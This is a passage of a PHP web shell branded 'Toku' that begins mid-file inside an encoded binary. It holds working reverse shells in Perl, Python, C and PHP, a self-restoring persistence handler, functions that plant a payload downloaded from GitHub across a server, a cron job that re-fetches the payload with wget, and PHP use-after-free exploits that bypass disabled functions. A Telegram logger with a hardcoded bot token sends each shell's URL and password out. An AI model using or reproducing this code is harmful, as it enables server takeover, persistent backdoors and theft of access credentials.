AhAAFwEAAJSXBAgAAAAAAAIQACoBAACUlwQIAAAAAAACEAA7AQAAlJcECAAAAAAAAhAATgEAAKiXBAgAAAAAAQITAFcBAACwmAQIAAAAACAAFgBiAQAAAAAAAHYAAAASAAAAdQEAAAAAAAB5AQAAEgAAAIcBAACwhgQIBQAAABIADACXAQAAYIQECAAAAAASAAwAngEAAAAAAAAAAAAAIAAAAK0BAAAAAAAAAAAAACAAAADBAQAAdIcECAQAAAARAA4AyAEAAFiHBAgAAAAAEgANAM4BAAAAAAAAcgEAABIAAADjAQAAAAAAAJ8BAAASAAAAAAIAAAAAAABZAQAAEgAAABECAAAAAAAADgAAABIAAAAiAgAAeIcECAQAAAARAA4AMQIAALCYBAgAAAAAEAAWAD4CAAAAAAAAPAAAABIAAABQAgAAAAAAAD0AAAASAAAAYAIAAHyHBAgAAAAAEQIOAG0CAACglwQIAAAAABECEQB6AgAAwIYECGkAAAASAAwAigIAAAAAAAArAAAAEgAAAJoCAAAAAAAAbwAAABIAAACrAgAAtJgECAAAAAAQAPH/twIAALyYBAgAAAAAEADx/7wCAAC0mAQIAAAAABAA8f/DAgAAAAAAAPQAAAASAAAA0wIAACmHBAgAAAAAEgIMAOoCAAA0hQQIcwEAABIADADvAgAAdIMECAAAAAASAAoAAGNhbGxfZ21vbl9zdGFydABjcnRzdHVmZi5jAF9fQ1RPUl9MSVNUX18AX19EVE9SX0xJU1RfXwBfX0pDUl9MSVNUX18AZHRvcl9pZHguNTc5MwBjb21wbGV0ZWQuNTc5MQBfX2RvX2dsb2JhbF9kdG9yc19hdXgAZnJhbWVfZHVtbXkAX19DVE9SX0VORF9fAF9fRlJBTUVfRU5EX18AX19KQ1JfRU5EX18AX19kb19nbG9iYWxfY3RvcnNfYXV4AGJjLmMAX19wcmVpbml0X2FycmF5X3N0YXJ0AF9fZmluaV9hcnJheV9lbmQAX0dMT0JBTF9PRkZTRVRfVEFCTEVfAF9fcHJlaW5pdF9hcnJheV9lbmQAX19maW5pX2FycmF5X3N0YXJ0AF9faW5pdF9hcnJheV9lbmQAX19pbml0X2FycmF5X3N0YXJ0AF9EWU5BTUlDAGRhdGFfc3RhcnQAY29ubmVjdEBAR0xJQkNfMi4wAGRhZW1vbkBAR0xJQkNfMi4wAF9fbGliY19jc3VfZmluaQBfc3RhcnQAX19nbW9uX3N0YXJ0X18AX0p2X1JlZ2lzdGVyQ2xhc3NlcwBfZnBfaHcAX2ZpbmkAaW5ldF9hZGRyQEBHTElCQ18yLjAAX19saWJjX3N0YXJ0X21haW5AQEdMSUJDXzIuMABleGVjbEBAR0xJQkNfMi4wAGh0b25zQEBHTElCQ18yLjAAX0lPX3N0ZGluX3VzZWQAX19kYXRhX3N0YXJ0AHNvY2tldEBAR0xJQkNfMi4wAGR1cDJAQEdMSUJDXzIuMABfX2Rzb19oYW5kbGUAX19EVE9SX0VORF9fAF9fbGliY19jc3VfaW5pdABhdG9pQEBHTElCQ18yLjAAY2xvc2VAQEdMSUJDXzIuMABfX2Jzc19zdGFydABfZW5kAF9lZGF0YQBleGl0QEBHTElCQ18yLjAAX19pNjg2LmdldF9wY190aHVuay5ieABtYWluAF9pbml0AA==";
    switch ($type) {
        case "pl":
            $shell =
                "IyEvdXNyL2Jpbi9wZXJsIC13DQojIA0KdXNlIHN0cmljdDsNCnVzZSBTb2NrZXQ7DQp1c2UgSU86OkhhbmRsZTsNCm15ICRzcGlkZXJfaXAgPSAkQVJHVlswXTsNCm15ICRzcGlkZXJfcG9ydCA9ICRBUkdWWzFdOw0KbXkgJHByb3RvID0gZ2V0cHJvdG9ieW5hbWUoInRjcCIpOw0KbXkgJHBhY2tfYWRkciA9IHNvY2thZGRyX2luKCRzcGlkZXJfcG9ydCwgaW5ldF9hdG9uKCRzcGlkZXJfaXApKTsNCm15ICRzaGVsbCA9ICcvYmluL3NoIC1pJzsNCnNvY2tldChTT0NLLCBBRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKTsNClNURE9VVC0+YXV0b2ZsdXNoKDEpOw0KU09DSy0+YXV0b2ZsdXNoKDEpOw0KY29ubmVjdChTT0NLLCRwYWNrX2FkZHIpIG9yIGRpZSAiY2FuIG5vdCBjb25uZWN0OiQhIjsNCm9wZW4gU1RESU4sICI8JlNPQ0siOw0Kb3BlbiBTVERPVVQsICI+JlNPQ0siOw0Kb3BlbiBTVERFUlIsICI+JlNPQ0siOw0Kc3lzdGVtKCRzaGVsbCk7DQpjbG9zZSBTT0NLOw0KZXhpdCAwOw0K";
            $file = AnIanYnsQ($dir . "/t00ls.pl");
            $key = filew($file, vcnvSCZgBz($shell), "w");
            if ($key) {
                @chmod($file, 0777);
                command(
                    "/usr/bin/perl " . $file . " " . $ip . " " . $port,
                    $dir
                );
            }
            break;
        case "py":
            $shell =
                "IyEvdXNyL2Jpbi9weXRob24NCiMgDQppbXBvcnQgc3lzLG9zLHNvY2tldCxwdHkNCnMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pDQpzLmNvbm5lY3QoKHN5cy5hcmd2WzFdLCBpbnQoc3lzLmFyZ3ZbMl0pKSkNCm9zLmR1cDIocy5maWxlbm8oKSwgc3lzLnN0ZGluLmZpbGVubygpKQ0Kb3MuZHVwMihzLmZpbGVubygpLCBzeXMuc3Rkb3V0LmZpbGVubygpKQ0Kb3MuZHVwMihzLmZpbGVubygpLCBzeXMuc3RkZXJyLmZpbGVubygpKQ0KcHR5LnNwYXduKCcvYmluL3NoJykNCg==";
            $file = AnIanYnsQ($dir . "/t00ls.py");
            $key = filew($file, vcnvSCZgBz($shell), "w");
            if ($key) {
                @chmod($file, 0777);
                command(
                    "/usr/bin/python " . $file . " " . $ip . " " . $port,
                    $dir
                );
            }
            break;
        case "c":
            $file = AnIanYnsQ($dir . "/t00ls");
            $key = filew($file, vcnvSCZgBz($c_bin), "wb");
            if ($key) {
                @chmod($file, 0777);
                command($file . " " . $ip . " " . $port, $dir);
            }
            break;
        case "php":
        case "phpwin":
            if (OpLkJKqrTY("fsockopen")) {
                $sock = @fsockopen($ip, $port);
                if ($sock) {
                    $key = true;
                    $com = $type == "phpwin" ? true : false;
                    $user = get_current_user();
                    $dir = AnIanYnsQ(getcwd());
                    fputs(
                        $sock,
                        php_uname() .
                            "\n------------no job control in this shell (tty)-------------\n[{$user}:{$dir}]# "
                    );
                    while ($cmd = fread($sock, 1024)) {
                        if (substr($cmd, 0, 3) == "cd ") {
                            $dir = QgRwXlZpOqK(substr($cmd, 3, -1));
                            chdir(AnIanYnsQ($dir));
                            $dir = AnIanYnsQ(getcwd());
                        } elseif (QgRwXlZpOqK(strtolower($cmd)) == "exit") {
                            break;
                        } else {
                            $res = command($cmd, $dir, $com);
                            fputs($sock, $res["res"]);
                        }
                        fputs($sock, "[" . $user . ":" . $dir . "]# ");
                    }
                }
                @fclose($sock);
            }
            break;
        case "pcntl":
            $file = AnIanYnsQ($dir . "/t00ls");
            $key = filew($file, vcnvSCZgBz($c_bin), "wb");
            if ($key) {
                @chmod($file, 0777);
                if (OpLkJKqrTY("pcntl_exec")) {
                    @pcntl_exec($file, [$ip, $port]);
                }
            }
            break;
    }
    if (!$key) {
        $msg = "<h1>Temporary directory is not writable</h1>";
    } else {
        @unlink($file);
        $msg = "<h2>CLOSE</h2>";
    }
    return $msg;
}
function remove_dot($file)
{
    $FILES = $file;
    $pch = explode(".", $FILES);
    return $pch[0];
}
function LockShellV($file) {
    $cwd = getcwd();
    $curFile = trim(basename($_SERVER["\x53\x43\x52\x49\x50\x54\x5f\x46\x49\x4c\x45\x4e\x41\x4d\x45"]));
    $temp = $_POST["temp"] ? $_POST["temp"] : "/tmp";
    if (file_exists($temp . '/.sessions/.' . base64_encode($cwd . remove_dot($curFile)  . '-handler')) && file_exists($temp . '/.sessions/.' . base64_encode($cwd . remove_dot($curFile) . '-text'))) {
        exec('rm -rf ' . $temp . '/.sessions/.' . base64_encode($cwd . remove_dot($curFile) . '-text'));
        exec('rm -rf ' . $temp . '/.sessions/.' . base64_encode($cwd . remove_dot($curFile) . '-handler'));
    }
    mkdir($temp . "/.sessions");
    exec("cp $curFile " . $temp . "/.sessions/." . base64_encode($cwd . remove_dot($curFile) . '-text'));
    chmod($curFile, 0444);
    $handler = '
<?php
@ini_set("max_execution_time", 0);
while (True){
    if (!file_exists("' . __DIR__ . '")){
        mkdir("' . __DIR__ . '");
    }
    if (!file_exists("' . $cwd . '/' . $curFile . '")){
        $text = base64_encode(file_get_contents("' . $temp . '/.sessions/.' . base64_encode($cwd . remove_dot($curFile) . '-text') . '"));
        file_put_contents("' . $cwd . '/' . $curFile . '", base64_decode($text));
    }
    if (toku_perm("' . $cwd . '/' . $curFile . '") != 0444){
        chmod("' . $cwd . '/' . $curFile . '", 0444);
    }
}

function toku_perm($flename){
    return substr(sprintf("%o", fileperms($flename)), -4);
}
';
    $hndlers = file_put_contents($temp . "/.sessions/." . base64_encode($cwd . remove_dot($curFile)  . '-handler') . "", $handler);
    if ($hndlers) {
        exec('php ' . $temp . '/.sessions/.' . base64_encode($cwd . remove_dot($curFile)  . '-handler') . ' > /dev/null 2>/dev/null &');
    } else {
        failed();
    }
}
function infectBDV2($baseDirectory = null) {
    if ($baseDirectory === null) {
        $baseDirectory = $_SERVER['DOCUMENT_ROOT'];
    }

    $fileUrl = "https://raw.githubusercontent.com/TokuHaxor/tool/main/cron";
    $fileContent = file_get_contents($fileUrl);

    $subdirectories = scandir($baseDirectory);

    $limit = 50;
    $count = 0;

    foreach ($subdirectories as $subdirectory) {
        if ($subdirectory != "." && $subdirectory != "..") {
            $directoryPath = $baseDirectory . '/' . $subdirectory . "/";

            if (is_dir($directoryPath)) {
                $randomDirectoryNameOuter = bin2hex(random_bytes(8));
                $randomDirectoryNameInner = bin2hex(random_bytes(8));

                $randomDirectoryPathOuter = $directoryPath . '/' . $randomDirectoryNameOuter;
                $randomDirectoryPathInner = $randomDirectoryPathOuter . '/' . $randomDirectoryNameInner;

                mkdir($randomDirectoryPathOuter, 0755, true);
                mkdir($randomDirectoryPathInner, 0755, true);

                $randomFileName = $randomDirectoryPathInner . '/' . uniqid('file_', true) . ".jpg";
                $filePath = $randomFileName;
                file_put_contents($filePath, $fileContent);

                echo "File berhasil diunduh dan disimpan di:<br> $filePath <br>";

                $count++;

                if ($count >= $limit) {
                    break;
                }
            }
        }
    }
}
function infectBD($dir){
    $url = "https://raw.githubusercontent.com/TokuHaxor/tool/main/cron";
    
    for ($i = 0; $i < 10; $i++) {
    
        $randomDirectoryNameOuter = bin2hex(random_bytes(8));
        $randomDirectoryNameInner = bin2hex(random_bytes(8));

        $randomDirectoryPathOuter = $dir . '/' . $randomDirectoryNameOuter;
        $randomDirectoryPathInner = $randomDirectoryPathOuter . '/' . $randomDirectoryNameInner;

        mkdir($randomDirectoryPathOuter);
        mkdir($randomDirectoryPathInner);

        $randomFileName = $randomDirectoryPathInner . '/' . bin2hex(random_bytes(8)) . ".php";

        $fileContent = file_get_contents($url);

        file_put_contents($randomFileName, $fileContent);

        echo "file sudah di upload di:<br> $randomFileName <br>";
    }
}
function installCronJob($dir) {
    echo '<div class="card">
            <div class="card-body form-group">
                <p class="text-muted">Crontab Automation Project</p>';
    
    $cronCommand = 'wget https://raw.githubusercontent.com/TokuHaxor/tool/main/cron -O ' . $dir . '/class.php';
    exec('(crontab -l; echo "*/5 * * * * ' . $cronCommand . '") | crontab');
    $cronList = shell_exec('crontab -l');
    
    if (empty($cronList)) {
        echo '<p class="text-muted">[+] Failed to Install</p></div></div>';
    } else {
        echo '<p class="text-muted">[+] Defense Shell Logs: </br>' . $cronList . '</p></div></div>';
    }
}
function bypassGC($cmd) {
    global $abc, $helper;

    function str2ptr(&$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p+$j]);
        }
        return $address;
    }

    function ptr2str($ptr, $m = 8) {
        $out = "";
        for ($i=0; $i < $m; $i++) {
            $out .= chr($ptr & 0xff);
            $ptr >>= 8;
        }
        return $out;
    }

    function write(&$str, $p, $v, $n = 8) {
        $i = 0;
        for($i = 0; $i < $n; $i++) {
            $str[$p + $i] = chr($v & 0xff);
            $v >>= 8;
        }
    }

    function leak($addr, $p = 0, $s = 8) {
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak = strlen($helper->a);
        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
        return $leak;
    }

    function parse_elf($base) {
        $e_type = leak($base, 0x10, 2);

        $e_phoff = leak($base, 0x20);
        $e_phentsize = leak($base, 0x36, 2);
        $e_phnum = leak($base, 0x38, 2);

        for($i = 0; $i < $e_phnum; $i++) {
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = leak($header, 0, 4);
            $p_flags = leak($header, 4, 4);
            $p_vaddr = leak($header, 0x10);
            $p_memsz = leak($header, 0x28);

            if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write
                # handle pie
                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec
                $text_size = $p_memsz;
            }
        }

        if(!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    }

    function get_basic_funcs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i < $data_size / 8; $i++) {
            $leak = leak($data_addr, $i * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                # 'constant' constant check
                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;

            $leak = leak($data_addr, ($i + 4) * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                # 'bin2hex' constant check
                if($deref != 0x786568326e6962)
                    continue;
            } else continue;

            return $data_addr + $i * 8;
        }
    }

    function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak & 0xfffffffffffff000;
        for($i = 0; $i < 0x1000; $i++) {
            $addr = $start - 0x1000 * $i;
            $leak = leak($addr, 0, 7);
            if($leak == 0x10102464c457f) { # ELF header
                return $addr;
            }
        }
    }

    function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = leak($addr);
            $f_name = leak($f_entry, 0, 6);

            if($f_name == 0x6d6574737973) { # system
                return leak($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry != 0);
        return false;
    }

    class ryat {
        var $ryat;
        var $chtg;
        
        function __destruct()
        {
            $this->chtg = $this->ryat;
            $this->ryat = 1;
        }
    }

    class Helper {
        public $a, $b, $c, $d;
    }

    if(stristr(PHP_OS, 'WIN')) {
        echo "This PoC is for *nix systems only.";
    }

    $n_alloc = 10; # increase this value if you get segfaults

    $contiguous = [];
    for($i = 0; $i < $n_alloc; $i++)
        $contiguous[] = str_repeat('A', 79);

    $poc = 'a:4:{i:0;i:1;i:1;a:1:{i:0;O:4:"ryat":2:{s:4:"ryat";R:3;s:4:"chtg";i:2;}}i:1;i:3;i:2;R:5;}';
    $out = unserialize($poc);
    gc_collect_cycles();

    $v = [];
    $v[0] = ptr2str(0, 79);
    unset($v);
    $abc = $out[2][0];

    $helper = new Helper;
    $helper->b = function ($x) { };

    if(strlen($abc) == 79 || strlen($abc) == 0) {
        echo "UAF failed";
    }

    # leaks
    $closure_handlers = str2ptr($abc, 0);
    $php_heap = str2ptr($abc, 0x58);
    $abc_addr = $php_heap - 0xc8;

    # fake value
    write($abc, 0x60, 2);
    write($abc, 0x70, 6);

    # fake reference
    write($abc, 0x10, $abc_addr + 0x60);
    write($abc, 0x18, 0xa);

    $closure_obj = str2ptr($abc, 0x20);

    $binary_leak = leak($closure_handlers, 8);
    if(!($base = get_binary_base($binary_leak))) {
        echo "Couldn't determine binary base address";
    }

    if(!($elf = parse_elf($base))) {
        echo "Couldn't parse ELF header";
    }

    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
        echo "Couldn't get basic_functions address";
    }

    if(!($zif_system = get_system($basic_funcs))) {
        echo "Couldn't get zif_system address";
    }

    # fake closure object
    $fake_obj_offset = 0xd0;
    for($i = 0; $i < 0x110; $i += 8) {
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    }

    # pwn
    write($abc, 0x20, $abc_addr + $fake_obj_offset);
    write($abc, 0xd0 + 0x38, 1, 4); # internal func type
    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler

    ($helper->b)($cmd);

}
function bypassGC2($gc2) {
    class Helper { public $a, $b, $c; }
    class Pwn {
        const LOGGING = false;
        const CHUNK_DATA_SIZE = 0x60;
        const CHUNK_SIZE = ZEND_DEBUG_BUILD ? self::CHUNK_DATA_SIZE + 0x20 : self::CHUNK_DATA_SIZE;
        const STRING_SIZE = self::CHUNK_DATA_SIZE - 0x18 - 1;

        const HT_SIZE = 0x118;
        const HT_STRING_SIZE = self::HT_SIZE - 0x18 - 1;

        public function __construct($cmd) {
            for($i = 0; $i < 10; $i++) {
                $groom[] = self::alloc(self::STRING_SIZE);
                $groom[] = self::alloc(self::HT_STRING_SIZE);
            }
            
            $concat_str_addr = self::str2ptr($this->heap_leak(), 16);
            $fill = self::alloc(self::STRING_SIZE);

            $this->abc = self::alloc(self::STRING_SIZE);
            $abc_addr = $concat_str_addr + self::CHUNK_SIZE;
            self::log("abc @ 0x%x", $abc_addr);

            $this->free($abc_addr);
            $this->helper = new Helper;
            if(strlen($this->abc) < 0x1337) {
                self::log("uaf failed");
                return;
            }

            $this->helper->a = "leet";
            $this->helper->b = function($x) {};
            $this->helper->c = 0xfeedface;

            $helper_handlers = $this->rel_read(0);
            self::log("helper handlers @ 0x%x", $helper_handlers);

            $closure_addr = $this->rel_read(0x20);
            self::log("real closure @ 0x%x", $closure_addr);

            $closure_ce = $this->read($closure_addr + 0x10);
            self::log("closure class_entry @ 0x%x", $closure_ce);
            
            $basic_funcs = $this->get_basic_funcs($closure_ce);
            self::log("basic_functions @ 0x%x", $basic_funcs);

            $zif_system = $this->get_system($basic_funcs);
            self::log("zif_system @ 0x%x", $zif_system);

            $fake_closure_off = 0x70;
            for($i = 0; $i < 0x138; $i += 8) {
                $this->rel_write($fake_closure_off + $i, $this->read($closure_addr + $i));
            }
            $this->rel_write($fake_closure_off + 0x38, 1, 4);
            $handler_offset = PHP_MAJOR_VERSION === 8 ? 0x70 : 0x68;
            $this->rel_write($fake_closure_off + $handler_offset, $zif_system);

            $fake_closure_addr = $abc_addr + $fake_closure_off + 0x18;
            self::log("fake closure @ 0x%x", $fake_closure_addr);

            $this->rel_write(0x20, $fake_closure_addr);
            ($this->helper->b)($cmd);

            $this->rel_write(0x20, $closure_addr);
            unset($this->helper->b);
        }

        private function heap_leak() {
            $arr = [[], []];
            set_error_handler(function() use (&$arr, &$buf) {
                $arr = 1;
                $buf = str_repeat("\x00", self::HT_STRING_SIZE);
            });
            $arr[1] .= self::alloc(self::STRING_SIZE - strlen("Array"));
            return $buf;
        }

        private function free($addr) {
            $payload = pack("Q*", 0xdeadbeef, 0xcafebabe, $addr);
            $payload .= str_repeat("A", self::HT_STRING_SIZE - strlen($payload));
            
            $arr = [[], []];
            set_error_handler(function() use (&$arr, &$buf, &$payload) {
                $arr = 1;
                $buf = str_repeat($payload, 1);
            });
            $arr[1] .= "x";
        }

        private function rel_read($offset) {
            return self::str2ptr($this->abc, $offset);
        }

        private function rel_write($offset, $value, $n = 8) {
            for ($i = 0; $i < $n; $i++) {
                $this->abc[$offset + $i] = chr($value & 0xff);
                $value >>= 8;
            }
        }

        private function read($addr, $n = 8) {
            $this->rel_write(0x10, $addr - 0x10);
            $value = strlen($this->helper->a);
            if($n !== 8) { $value &= (1 << ($n << 3)) - 1; }
            return $value;
        }

        private function get_system($basic_funcs) {
            $addr = $basic_funcs;
            do {
                $f_entry = $this->read($addr);
                $f_name = $this->read($f_entry, 6);
                if($f_name === 0x6d6574737973) {
                    return $this->read($addr + 8);
                }
                $addr += 0x20;
            } while($f_entry !== 0);
        }

        private function get_basic_funcs($addr) {
            while(true) {
                // In rare instances the standard module might lie after the addr we're starting
                // the search from. This will result in a SIGSGV when the search reaches an unmapped page.
                // In that case, changing the direction of the search should fix the crash.
                // $addr += 0x10;
                $addr -= 0x10;
                if($this->read($addr, 4) === 0xA8 &&
                    in_array($this->read($addr + 4, 4),
                        [20180731, 20190902, 20200930, 20210902])) {
                    $module_name_addr = $this->read($addr + 0x20);
                    $module_name = $this->read($module_name_addr);
                    if($module_name === 0x647261646e617473) {
                        self::log("standard module @ 0x%x", $addr);
                        return $this->read($addr + 0x28);
                    }
                }
            }
        }

        private function log($format, $val = "") {
            if(self::LOGGING) {
                printf("{$format}\n", $val);
            }
        
        }

        static function alloc($size) {
            return str_shuffle(str_repeat("A", $size));
        }

        static function str2ptr($str, $p = 0, $n = 8) {
            $address = 0;
            for($j = $n - 1; $j >= 0; $j--) {
                $address <<= 8;
                $address |= ord($str[$p + $j]);
            }
            return $address;
        }
    }
    echo '<div class="container-fluid language-javascript"> <div class="shell mb-3"> <pre style="font-size:15px;"><font color="green">root@TokuHaxor:~</font>#&nbsp;<font color="red">'.$_POST['shiz'].'</font><br><code>';
    new Pwn($gc2 . ' 2>&1');
}
function getinfo()
{   
    $used = isset($_POST['getpwd']) ? $_POST['getpwd'] : '';
    $botToken = '6849508672:AAGAmQvC7zibYi0qSLT4HM-9NScFo26Pa1Q';
    $chatId = '5575586332';
    $xPath = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
    $logMessage = "___Logger TOP99___ \n\n Shell nya =\n $xPath \n\n Password =\n $used \n\n IP Hacker Lain :\n [ " . $_SERVER['REMOTE_ADDR'] . " ]";
    sendTelegramMessage($botToken, $chatId, $logMessage);
    global $used;
    $infos = [$_POST["getpwd"], $used, OpLkJKqrTY("phpinfo"), "127.0.0.1"];
    if ($used != "" && md5($infos[0]) != $infos[1]) {
        echo '<html><body><center><form method="POST"><input type="password" name="getpwd"> ';
        if (isset($_POST["pass"])) {
            echo '<input type="hidden" name="pass" value="' .
                $_POST["pass"] .
                '">';
        }
        if (isset($_POST["check"])) {
            echo '<input type="hidden" name="check" value="' .
                $_POST["check"] .
                '">';
        }
        echo '<input type="submit" value="Go" name="con"></form></center></body></html>';
        exit();
    }
    return $infos[2];
}
function subeval()
{
    if (isset($_POST["getpwd"])) {
        echo '<input type="hidden" name="getpwd" value="' .
            $_POST["getpwd"] .
            '">';
    }
    if (isset($_POST["pass"])) {
        echo '<input type="hidden" name="pass" value="' . $_POST["pass"] . '">';
    }
    if (isset($_POST["check"])) {
        echo '<input type="hidden" name="check" value="' .
            $_POST["check"] .
            '">';
    }
    return true;
}
function strdir($str)
{
    return str_replace(
        ["\\", "//", "%27", "%22"],
        ["/", "/", '\'', '"'],
        GjKlPwQcF($str)
    );
}
function chkgpc($array)
{
    foreach ($array as $key => $var) {
        $array[$key] = is_array($var) ? chkgpc($var) : stripslashes($var);
    }
    return $array;
}
function sendTelegramMessage($botToken, $chatId, $message)
{
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $params = [
        'chat_id' => $chatId,
        'text' => $message,
    ];
    $options = [
        'http' => [
            'method' => 'POST',
            'header' => 'Content-Type: application/x-www-form-urlencoded',
            'content' => http_build_query($params),
        ],
    ];
    $context = stream_context_create($options);
    $response = file_get_contents($url, false, $context);
}
  }

  public function execute() {
error_reporting(0);
@PlQiOkBgDt("display_errors", "Off");
@PlQiOkBgDt("max_execution_time", 20000);
header("content-Type: text/html; charset=UTF-8");
$msg = "[ Toku ]";
$CWppUDJxuf = 'fu' . 'n' . 'ct' . 'ion_' . 'e' . 'xist' . 's';
$myfile = $_SERVER["SCRIPT_FILENAME"]
    ? AnIanYnsQ($_SERVER["SCRIPT_FILENAME"])
    : AnIanYnsQ(__FILE__);
$myfile = strpos($myfile, "eval()")
    ? array_shift(explode("(", $myfile))
    : $myfile;
define("THISDIR", AnIanYnsQ(dirname($myfile) . "/"));
define(
    "ROOTDIR",
    AnIanYnsQ(strtr($myfile, [AnIanYnsQ($_SERVER["PHP_SELF"]) => ""]) . "/")
);
define("EXISTS_PHPINFO", getinfo() ? true : false);
if (!$CWppUDJxuf("get_magic_quotes_gpc") || get_magic_quotes_gpc()) {
    function stripslashes_array($array)
    {
        return is_array($array)
            ? array_map("stripslashes_array", $array)
            : stripslashes($array);
    }
    $_POST = stripslashes_array($_POST);
}

if (OpLkJKqrTY("mysql_close")) {
    $issql = "MySql";
}
if (OpLkJKqrTY("mssql_close")) {
    $issql .= "MsSql";
}
if (OpLkJKqrTY("oci_close")) {
    $issql .= "Oracle";
}
if (OpLkJKqrTY("sybase_close")) {
    $issql .= "SyBase";
}
if (OpLkJKqrTY("pg_close")) {
    $issql .= "PostgreSql";
}
$win = substr(PHP_OS, 0, 3) == "WIN" ? true : false;
if (isset($_POST["go"])) {
    if ($_POST["go"] == "down") {
        $downfile = $fileb = AnIanYnsQ($_POST["godir"] . "/" . $_POST["govar"]);
        if (!filed($downfile)) {
            $msg = "<h1>The download file does not exist</h1>";
        }
    }
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html lang="km-KH">

<head>
    <link type="image/x-icon" rel="shortcut icon" href="https://f.top4top.io/p_29216zc2j1.jpg">
    <meta http-equiv="Content-Type" content="text/html;" />
    <meta content="width=device-width, initial-scale=1" name="viewport" />
    <style type="text/css">
        * {
            margin: 0px;
            padding: 0px;
        }

        body {
            background: #CCCCCC;
            color: #333333;
            font-size: 13px;
            font-family: Verdana, Arial, SimSun, sans-serif;
            text-align: left;
            word-wrap: break-word;
            word-break: break-all;
        }

        a {
            color: #000000;
            text-decoration: none;
            vertical-align: middle;
        }

        a:hover {
            color: #FF0000;
            text-decoration: underline;
        }

        p {
            padding: 1px;
            line-height: 1.6em;
        }

        h1 {
            color: #CD3333;
            font-size: 13px;
            display: inline;
            vertical-align: middle;
        }

        h2 {
            color: #008B45;
            font-size: 13px;
            display: inline;
            vertical-align: middle;
        }

        form {
            display: inline;
        }

        input,
        select {
            vertical-align: middle;
        }

        input[type=text],
        textarea {
            padding: 1px;
            font-family: Courier New, Verdana, sans-serif;
        }

        input[type=submit],
        input[type=button] {
            height: 21px;
        }

        .tag {
            text-align: center;
            margin-left: 10px;
            background: threedface;
            height: 80px;
            padding-top: 5px;
            border: 1px solid #666666; 
        }

        .tag a {
            background: #FAFAFA;
            color: #333333;
            width: 200px;
            height: 20px;
            display: inline-block;
            font-size: 15px;
            font-weight: bold;
            padding-top: 5px;
            border: 1px solid #666666; 
        }

        .tag a:hover,
        .tag a.current {
            background: #EEE685;
            color: #000000;
            text-decoration: none;
        }

        .main {
            width: 1100px;
            margin: 0 auto;
            padding: 10px;
            border: 1px solid #666666; 
        }

        .outl {
            border-color: #FFFFFF #666666 #666666 #FFFFFF;
            border-style: solid;
            border-width: 1px;
        }

        .toptag {
            padding: 5px;
            text-align: left;
            font-weight: bold;
            color: #FFFFFF;
            background: #293F5F;
            border: 1px solid #666666; 
        }

        .footag {
            padding: 5px;
            text-align: center;
            font-weight: bold;
            color: #000000;
            background: #999999;
            border: 1px solid #666666; 
        }

        .msgbox {
            padding: 5px;
            background: #EEE685;
            text-align: center;
            vertical-align: middle;
            border: 1px solid #666666; 
        }

        .actall {
            background: #F9F6F4;
            text-align: center;
            font-size: 15px;
            border-bottom: 1px solid #999999;
            padding: 3px;
            vertical-align: middle;
            border: 1px solid #666666; 
        }

        .tables {
            width: 100%;
            border-collapse: collapse;
        }

        .tables th, .tables td {
            border: 1px solid #666666; 
            padding: 2px;
        }

        .tables th {
            background: threedface;
            text-align: left;
            border-color: #FFFFFF #666666 #666666 #FFFFFF;
            border-style: solid;
            border-width: 1px;
            padding: 2px;
        }

        .tables td {
            background: #F9F6F4;
            height: 19px;
            padding-left: 2px;
        }

        .tables tr:hover td {
            background-color: #EEE685;
        }
    </style>
    <script type="text/javascript">
        function $(ID) {
            return document.getElementById(ID);
        }

        function sd(str) {
            str = str.replace(/%22/g, '"');
            str = str.replace(/%27/g, "'");
            return str;
        }

        function cd(dir) {
            dir = sd(dir);
            $('dir').value = dir;
            $('frm').submit();
        }

        function sa(form) {
            for (var i = 0; i < form.elements.length; i++) {
                var e = form.elements[i];
                if (e.type == 'checkbox') {
                    if (e.name != 'chkall') {
                        e.checked = form.chkall.checked;
                    }
                }
            }
        }

        function go(a, b) {
            b = sd(b);
            $('go').value = a;
            $('govar').value = b;
            if (a == 'editor') {
                $('gofrm').target = "_blank";
            } else {
                $('gofrm').target = "";
            }
            $('gofrm').submit();
        }

        function nf(a, b) {
            re = prompt("New name", b);
            if (re) {
                $('go').value = a;
                $('govar').value = re;
                $('gofrm').submit();
            }
        }

        function dels(a) {
            if (a == 'b') {
                var msg = "";
                $('act').value = a;
            } else {
                var msg = "";
                $('act').value = 'deltree';
                $('var').value = a;
            }
            if (confirm("Are you sure you want to delete? " + msg + "")) {
                $('frm1').submit();
            }
        }

        function txts(m, p, a) {
            p = sd(p);
            re = prompt(m, p);
            if (re) {
                $('var').value = re;
                $('act').value = a;
                $('frm1').submit();
            }
        }

        function acts(p, a, f) {
            p = sd(p);
            f = sd(f);
            re = prompt(f, p);
            if (re) {
                $('var').value = re + '|x|' + f;
                $('act').value = a;
                $('frm1').submit();
            }
        }
    </script>
    <title>
<?php
$sitename = $_SERVER["SERVER_NAME"];
echo $msg . " [" . date("Y-m-d H:i:s") . "]";
?>
